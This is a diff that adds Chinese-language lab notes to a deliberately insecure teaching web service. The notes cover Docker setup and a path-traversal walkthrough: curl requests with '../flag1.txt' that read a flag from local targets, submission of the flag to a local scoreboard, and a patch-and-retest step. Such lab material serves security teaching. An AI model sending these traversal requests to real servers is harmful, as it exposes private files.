@@ -1,3 +1,41 @@
+# 1、`sudo apt update && sudo apt install -y docker.io docker-compose`
+## 安装docker.io与docker-compose
+# 2、`sudo systemctl enable --now docker`
+## 启动Docker服务并设定开机自启
+# 3、`sudo usermod -aG docker $USER`
+## 允许目前使用者免sudo执行Docker(需重新登入才生效)
+
+# 4、`cd labs/lab-a && docker compose up -d --build`
+## 第一次约1-2分钟(要拉映像),起来后确认三个东西
+# 5、`docker compose ps`
+## lab-a-target-a-1 target-a 0.0.0.0:8001->8000/tcp
+## lab-a-target-b-1 target-b 0.0.0.0:8002->8000/tcp
+## lab-a-board-1 board 0.0.0.0:8080->8000/tcp
+
+# 6、洞1
+## `curl -s 'localhost:8001/download?file=welcome.txt'`
+## `curl -s -o /dev/null -w '%{http_code}\n' 'localhost:8001/download?file=nope.txt'`
+## `sed -n '115;117p' target/app.py`
+## `python3 -c "import os; print(os.path.join('/srv/notes','../flag1.txt'))"`
+## `curl -s 'localhost:8001/download?file=../flag1.txt'`
+## `F=$(curl -s 'localhost:8002/download?file=../flag1.txt')`
+## `echo $F`
+## `curl -s -o /dev/null -w '%{http_code}\n' -d "flag=$F" localhost:8080/submit`
+## 补丁
+### `vi target/app.py`
+### `docker compose up --d --build target-a`
+### `curl -s 'localhost:8001/download?file=../flag1.txt'`
+### `curl -s 'localhost:8001/download?file=welcome.txt'`
+
+
+
+
+
+
+
+
+
+
 ```
 # 1
 """MOCS Notes —— 一個「有洞」的筆記服務（教學用，故意不安全）
@@ -124,6 +162,14 @@ def download():
     except OSError:
         return "not found", 404
     return body, 200, {"Content-Type": "text/plain; charset=utf-8"}
+
+
+
+# 漏洞1 :路径穿越(/download路由)
+## `os.path.join`遇到用户传入的`../`时会向上跳级,直接跳出`NOTES_DIR`(笔记目录),开发者没有过滤`../`
+## 在浏览器访问`/download?file=../flag1.txt`即可直接读取上一级(/srv)里的flag1.txt
+
+
 
 @app.get("/hello")
 def hello():
